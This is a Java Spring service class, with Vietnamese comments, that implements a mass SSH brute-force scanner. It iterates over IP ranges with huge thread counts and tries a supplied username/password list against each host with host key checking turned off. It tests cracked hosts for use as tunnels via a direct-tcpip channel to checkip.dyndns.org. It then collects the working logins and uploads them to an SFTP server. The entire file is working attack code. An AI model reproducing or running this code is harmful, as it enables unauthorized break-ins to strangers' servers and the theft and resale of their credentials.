/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Business;

import Pojos.*;
import Service.IPService;
import Service.UploadService;
import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelDirectTCPIP;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class ScanSSH {

    private static final int MaxThread = 2000000;

    //thong tin ve ssh se duoc cung cap cho controller
    private long TotalIps = 0;
    private long TotalIpsChecked = 0;
    private int NumberOfThreads;// truyen vao tu controller
    private int NumberOfIpsLive = 0;
    private int CurrentThreadActive = 0;
    // du lieu de ssh hoat dong
    private static Object syncObj = new Object();
    private Object ObjThread = new Object();

    private Thread[] thread;
    private Thread ThreadCheckStop;
    private List<RangeIp> ListsRangeIp;
    private List<String> ListsRange; // truyen vao tu controller
    private List<InfoToConnectSSH> ListsResultIps = new ArrayList<>();
    private List<InfoToConnectSSH> ListsUserPass; //truyen vao tu controller
    private boolean[] Bit_CheckIps;
    private int TotalRange = 0;
    private String String_IpRangeFocus = "";
    private String String_IpRangeEndFocus = "";
    private long Long_IpRangeFocus = 0;
    private long Long_IpRangeEndFocus = 0;
    private int TimeOut = 30;
    private int CountIpRange = 0;
    private int IndexOfListRange = 0;
    private boolean flag = true;
    private boolean FlagActive = false;
    private String HostCheckFresh = "checkip.dyndns.org";
    private int PortCheckFresh = 80;
    //
    private int CurrentThreadActive2 = 0;
    private int NumberOfIpsLive2 = 0;
    private long TotalIps2 = 0;
    private long TotalIpsChecked2 = 0;
    private int NumberOfThreads2 = 0;
    @Autowired
    IPService iPService;
    @Autowired
    UploadService uploadService;
    @Autowired
    JSch sshClient;

    //khoi tao cac gia tri ban dau
    public void StartSetting() throws InterruptedException {
        String Message = "";
        FlagActive = true;
        //tao list range ip
        ListsRangeIp = iPService.getListRange(ListsRange);
        //tinh tong range
        TotalRange = ListsRangeIp.size();
        //tinh tong ip

        TotalIps = iPService.getTotalIps(ListsRangeIp);
        //
        if (ListsRangeIp == null) {
            Message = "khong co du lieu";
            return;
        }
        //
        if (NumberOfThreads > MaxThread) {
            Message = "thread qua nhieu";
            return;
        }

        //tao mang thread
        if (TotalIps <= NumberOfThreads) {
            NumberOfThreads = (int) TotalIps;
        }

        thread = new Thread[NumberOfThreads];
        //tao mang bit_check
        Bit_CheckIps = new boolean[NumberOfThreads];
        //run thread
        for (int i = 0; i < NumberOfThreads; i++) {
            Run(i);
            Thread.sleep(100);
        }

        Thread manager = new Thread() {
            @Override
            public void run() {
                try {
                    manager();
                } catch (Exception e) {
                    e.getMessage();
                }

            }
        };
        manager.start();

        //tao thread check viec dung
        ThreadCheckStop = new Thread() {
            @Override
            public void run() {
                try {
                    CheckStopAndUpload();
                } catch (Exception e) {
                    e.getMessage();
                }

            }
        };
        Thread.sleep(60000);
        ThreadCheckStop.start();

    }

    public void CheckStopAndUpload() throws FileNotFoundException, InterruptedException {
//true

        while (true) {
            Thread.sleep(30000);
            try {
                if (!flag) {
                    uploadService.uploadFileTempToSFtpServer(ListsResultIps);
                    flag = true;
                    FlagActive = false;
                    break;
                } else {
                    //false
                    flag = false;
                    for (int i = 0; i < thread.length; i++) {

                        flag = flag || thread[i].isAlive();
                    }

                }
            } catch (Exception e) {
                e.getMessage();
            }

        }

    }

    public void Run(int id_thread) {

        thread[id_thread] = new Thread() {
            @Override
            public void run() {
                try {
                    CurrentThreadActive++;
                    Check_USER_PASS_START(id_thread);

                } catch (Exception e) {
                    e.getMessage();
                }

            }
        };
        thread[id_thread].start();
    }

    public void manager() {
        try {
            while (true) {
                Thread.sleep(1000);

                if (IndexOfListRange >= TotalRange && CurrentThreadActive == 0) {
                    break;
                } else {
                    CurrentThreadActive2 = CurrentThreadActive;
                    NumberOfIpsLive2 = NumberOfIpsLive;
                    TotalIps2 = TotalIps;
                    TotalIpsChecked2 = TotalIpsChecked;
                    NumberOfThreads2 = NumberOfThreads;
                }
            }

        } catch (Exception e) {
            e.getMessage();
        }
    }

    public void Check_USER_PASS_START(int id_thread) {
        String S_IpBeginTemp = "";
        long L_IpEndTemp = 0;
        long L_IpBeginTemp = 0;
        try {
            while (true) {
                synchronized (syncObj) {
                    //kiem tra con range trong list range khong
                    if (IndexOfListRange < TotalRange) {

                        Long_IpRangeEndFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeEnd());
                        Long_IpRangeFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeBegin()) + CountIpRange;
                        //ip con trong range khong con thi lam
                        S_IpBeginTemp = iPService.longToIp2(Long_IpRangeFocus);
                        L_IpEndTemp = Long_IpRangeEndFocus;
                        L_IpBeginTemp = Long_IpRangeFocus;
                        if (Long_IpRangeFocus <= Long_IpRangeEndFocus) {

                            CountIpRange++;
                            TotalIpsChecked++;
                        } else {
                            //het ip trong range , doi sang range tiep theo
                            IndexOfListRange++;
                            CountIpRange = 0;
                        }

                    } else {
                        CurrentThreadActive--;
                        break;
                    }

                }

                if (L_IpBeginTemp <= L_IpEndTemp) {
                    for (int i = 0; i < ListsUserPass.size(); i++) {
                        byte check = CHECK_LIVE(S_IpBeginTemp, ListsUserPass.get(i).getUsername(), ListsUserPass.get(i).getPassword(), id_thread);
                        System.out.println("ip :" + S_IpBeginTemp + " user :" + ListsUserPass.get(i).getUsername() + " pass : " + ListsUserPass.get(i).getPassword());
                        if (check == 1) {

                            InfoToConnectSSH info = new InfoToConnectSSH();
                            info.setHost(S_IpBeginTemp);
                            info.setUsername(ListsUserPass.get(i).getUsername());
                            info.setPassword(ListsUserPass.get(i).getPassword());

                            ListsResultIps.add(info);

                            break;
                        }
                    }
                }

            }
        } catch (Exception e) {
            e.getMessage();
        }

    }

    public byte CHECK_LIVE(String STR_IP, String User, String Pass, int id) throws JSchException {

        Session session = null;
        session = sshClient.getSession(User, STR_IP);
        session.setTimeout(TimeOut * 1000);
        session.setConfig("StrictHostKeyChecking", "no");
        session.setConfig("GSSAPIAuthentication", "no");
        session.setConfig("kex", "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256");
        session.setConfig("server_host_key", "ssh-dss,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521");
        session.setConfig("cipher.c2s",
                "blowfish-cbc,3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");

        try {

            if (apply_user_pass(session, Pass, id) == 1) {

                return 1;
            }

        } catch (Exception e) {
            e.getMessage();
        }
        return 0;
    }

    public byte apply_user_pass(Session s, String pass, int id) throws IOException {

        try {
            Bit_CheckIps[id] = false;
            Thread thread = new Thread() {
                @Override
                public void run() {
                    try {
                        Check_ssh(s, id, pass);
                    } catch (JSchException ex) {
                        Logger.getLogger(ScanSSH.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            };
            thread.start();

            int g = 0;
            while ((thread.isAlive() == true) && (g < TimeOut)) {

                Thread.sleep(1000);
                g++;
            }
            thread.stop();

            if (g >= TimeOut) {
                s.disconnect();
                return 0;
            }

            if (Bit_CheckIps[id] == false) {
                s.disconnect();
                return 0;
            }

            s.disconnect();
            return 1;
        } catch (Exception e) {
            e.getMessage();
            s.disconnect();
            return 0;
        }

    }

    public void Check_ssh(Session session, int id, String pass) throws JSchException {

        try {
            //check connect ip
            session.setPassword(pass);
            session.connect();

            //check fresh ip
            Channel channel = session.openChannel("direct-tcpip");
            ((ChannelDirectTCPIP) channel).setHost(HostCheckFresh);
            ((ChannelDirectTCPIP) channel).setPort(PortCheckFresh);

            channel.connect(10000);

            Bit_CheckIps[id] = true;
            NumberOfIpsLive++;
        } catch (Exception ex) {
            ex.getMessage();

        }

    }

    public int getCurrentThreadActive2() {
        return CurrentThreadActive2;
    }

    public int getNumberOfIpsLive2() {
        return NumberOfIpsLive2;
    }

    public long getTotalIps2() {
        return TotalIps2;
    }

    public long getTotalIpsChecked2() {
        return TotalIpsChecked2;
    }

    //thong tin ve ssh se duoc cung cap cho controller
    public int getNumberOfThreads2() {
        return NumberOfThreads2;
    }

    public void setNumberOfThreads(int NumberOfThreads) {
        this.NumberOfThreads = NumberOfThreads;
    }

    public void setListsRange(List<String> ListsRange) {
        this.ListsRange = ListsRange;
    }

    public void setListsUserPass(List<InfoToConnectSSH> ListsUserPass) {
        this.ListsUserPass = ListsUserPass;
    }

    public List<InfoToConnectSSH> getListsResultIps() {
        return ListsResultIps;
    }

    public void setListsResultIps(List<InfoToConnectSSH> ListsResultIps) {
        this.ListsResultIps = ListsResultIps;
    }

    public Thread[] getThread() {
        return thread;
    }

    public boolean isFlagActive() {
        return FlagActive;
    }

}
